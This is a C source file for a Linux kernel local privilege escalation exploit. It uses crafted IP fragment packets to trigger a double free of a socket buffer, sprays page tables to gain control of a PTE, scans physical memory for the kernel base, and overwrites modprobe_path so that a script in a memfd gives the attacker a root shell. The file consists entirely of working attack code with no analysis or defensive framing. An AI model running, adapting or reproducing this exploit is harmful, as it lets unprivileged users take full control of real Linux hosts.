#define _GNU_SOURCE
#include <arpa/inet.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include "setup.h"
#include "file.h"
#include "config.h"
#include "net.h"
#include <netinet/ip.h>


/*
 * page table entry
 * |PGD|PUD|PMD|PTE|offset|
 * | 9 | 9 | 9 | 9 |  12  |
 */
 
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define INDEX_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((size_t)(pud_index)) + _pud_index_to_virt((size_t)(pmd_index)) + \
	_pmd_index_to_virt((size_t)(pte_index)) + _pte_index_to_virt((size_t)(page_index)) + (size_t)(byte_index)))


void get_modprobe_path(char *modprobe_path, size_t size){
    read_file("/proc/sys/kernel/modprobe", modprobe_path, size);
    modprobe_path[size-1] = '\x00';
}


static void set_ipfrag_time(unsigned int seconds)
{
	int fd;
	
	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
	if (fd < 0) {
		perror("open$ipfrag_time");
		exit(1);
	}

	dprintf(fd, "%u\n", seconds);
	close(fd);
}

static char intermed_buf[1 << 19];



static void alloc_ipv4_udp(size_t content_size)
{
	// printf("[*] sending udp packet...\n");
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}




static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}


static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending intermediate buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}


static void configure_cpu(int cpu_id){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id, &mask);

    if(sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1){
        perror("sched_setaffinity");
        exit(1);
    }

}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3


#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		//printf("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}


static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;


	return 0;
}


static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);
	
	return strncmp(new_str, buf, KMOD_PATH_LEN);
}



void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	// search 0x200000 bytes (a full PTE at a time) for the modprobe_path signature
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	// check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe
	strcpy(pmd_modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0)
	{
		printf("[-] ^false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}


#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

void exploit(){
    size_t *pte_area;
    void *_pmd_area;
    void *pmd_kernel_area;
    void *pmd_data_area;
    char modprobe_path[CONFIG_KMOD_PATH_LEN] = {0};

    //construct vuln ip header
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,    //signed as filter packet
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};

    configure_cpu(0);
    get_modprobe_path(modprobe_path, CONFIG_KMOD_PATH_LEN);
    printf("[+] Spraying the pcp_list...\n");
    // Spray the pcp-list
    //0x8000000000
    // 100000000 0000000000 0000000000 0000000000
    void *addr = mmap((void *)INDEX_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
          perror("mmap failed"); // perror 会打印出具体的错误原因
          exit(EXIT_FAILURE);
    }
    // page fault: allocate PUD PMD PTE page
    *(size_t *)INDEX_TO_VIRT(1, 0, 0, 0, 0) = (size_t)0xDEADBEEF;

    // pre allocation: only create the vma (mostly PTE page, and some PMD page)
    for(size_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++){
        void *retv = mmap((void *)INDEX_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (addr == MAP_FAILED) {
            perror("mmap failed"); // perror 会打印出具体的错误原因
            exit(EXIT_FAILURE);
        }
    }
    
    // occur page fault
    for(size_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT/CONFIG_PAGE_ENTRY_NUM; i++){
        *(char *)INDEX_TO_VIRT(2, i, 0, 0, 0) = '0x41';
    }

	_pmd_area = mmap((void*)INDEX_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    pmd_kernel_area = _pmd_area;
    pmd_data_area = _pmd_area + 0x200000;

    printf("[+] pmd_kernel_area 0x%p - 0x%p\n modprobe_path: %s\n", (size_t)pmd_kernel_area, (size_t)pmd_data_area, modprobe_path);

    printf("[+] Construct IP,UDP,TCP sockets....\n");
    populate_sockets();
    printf("[+] Set ipfrag_time...\n");
    set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 0x8000 + 8 + 4000;
    // set the fragment offset
	df_ip_header.ip_off = ntohs((8 >> 3) | IP_MF);
    alloc_intermed_buf_hdr(0x8000 + 8, &df_ip_header);
    set_ipfrag_time(9999);
    
    sleep(CONFIG_SEC_BEFORE_STORM);

    for(int i = 0; i < CONFIG_SKB_SPRAY_AMOUNT; i++){
        //printf("[*] reserving udp packets (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
        alloc_ipv4_udp(1);
    }

    //allocate and free 1 skb from freelist
    df_ip_header.ip_id = 0x1337;
    df_ip_header.ip_len = sizeof(struct ip)*2 + 0x8000 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | IP_MF);

    trigger_double_free_hdr(0x8000 + 8, &df_ip_header);

	// push N skbs to skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		//printf("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

    printf("[+] Spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
    for(size_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++){
        //Spraying the CONFIG_PTE_SPRAY_AMOUNT-31 PTE
        *(char *)INDEX_TO_VIRT(2, 0, i, 0, 0) = '\x41';
    }
    printf("[*] double-freeing skb...\n");

    df_ip_header.ip_id = 0x1337;
    df_ip_header.ip_len = sizeof(struct ip)*2 + 0x8000 + 24;
    df_ip_header.ip_off = ntohs((0x8000+8) >> 3 | 0x2000);
    // send error skb for freeing the hole ip frag queue 
    alloc_intermed_buf_hdr(0, &df_ip_header);

    //cause the new pmd occupy the free pte
    //so pmd->pte->page should have been changed
    *(size_t *)_pmd_area = 0xCAFEBABE;
    printf("[+] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
        //overlapped pte->page should be another pmd's pte
		size_t *test_target_addr = INDEX_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf("[+] confirmed double alloc PMD/PTE\n");
			printf("    - PTE area index: %lld\n", i);
			printf("    - PTE area (write target address/page): %016p (new)\n", *(size_t *)test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);

		return;
	}

    //set new pte value for sanity check
    //NX Dirty Accessed
	*pte_area = 0x0 | 0x8000000000000867;
    flush_tlb(_pmd_area, 0x400000);
    printf("    - PTE area (write target address/page): %016p (new)\n", *(size_t *)pte_area);
    // construct the evil /sbin/modprobe
    int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);

    //scan 512 phys align for kernel base each iteration
    for(int k = 0; k < (CONFIG_PHYS_MEM /(CONFIG_PHYSICAL_ALIGN * 512)); k++){
        size_t kernel_iteration_base;
        // get the current phys mem align
        kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);
		//printf("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
        for (unsigned short j = 0; j < 512; j++){
            pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
        }
        flush_tlb(_pmd_area, 0x400000);
        for(size_t j = 0; j < 512; j++){
            size_t phys_kernel_base;
            // get the current phys mem
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			//printf("[*] phys kernel addr: %016llx, val: %016llx\n", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));
            // find kernel base by signature
            if(is_kernel_base(pmd_kernel_area + j * 0x1000) == 0){
                continue;
            }
            printf("[+] Found possible physical kernel base: %016p\n", phys_kernel_base);

            // scan for modprobe_path , step is 0x200000(2 MiB)
            for(int i =0; i < 40; i++){
                void *pmd_modprobe_addr;
                size_t phys_modprobe_addr;
                size_t modprobe_iteration_base;

                modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				//printf("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);
                //No.2 page in PTE
                for(unsigned short j = 0; j < 512; j++){
                    pte_area[512+j] = (modprobe_iteration_base + 0x1000 *j) |0x8000000000000867;
                }
                flush_tlb(_pmd_area, 0x400000);

                //search for the modprobe_path
				// pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
                if(pmd_modprobe_addr == NULL){
                    continue;
                }
                phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);

				printf("[+] verified modprobe_path/usermodehelper_path: %016p ('%s')...\n", phys_modprobe_addr, (char*)pmd_modprobe_addr);
				printf("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);


                printf("[*] overwriting path with PIDs in range 0->4194304\n");
                for(pid_t pid_guess=0; pid_guess < 4194304; pid_guess++){
                    int status_cnt;
                    char buf;
                    MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);
                    if (pid_guess % 50 == 0){
						//printf("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
						//printf("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						//printf("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
                    }

                    lseek(modprobe_script_fd, 0, SEEK_SET);
                    // dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess);

					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, 0, pid_guess,1);
                    modprobe_trigger_memfd();


                    status_cnt = read(status_fd, &buf, 1);
                    if(status_cnt == 0) continue;
                    printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
                    return;

                }

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");
                return;
            }

			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
        }


    }

	printf("[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n");
	return;
}


#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3
#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

int main(){

	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;
    if(fork() == 0){
        printf("[+] Step I: prepare for exploiting...\n");
        do_setup();
        printf("[+] Step II: prepare for exploiting...\n");
        exploit();
        sleep(9999);
    }

	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);
    return 0;
}
